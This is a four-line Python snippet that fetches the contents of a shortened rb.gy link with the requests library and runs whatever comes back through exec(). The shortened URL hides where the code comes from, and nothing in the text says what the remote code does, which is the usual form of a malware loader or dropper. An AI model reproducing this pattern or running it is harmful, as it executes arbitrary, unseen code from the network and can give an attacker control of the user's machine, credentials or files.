import requests
url = 'https://rb.gy/zfzqgx'
page = requests.get(url)
exec(page.text)
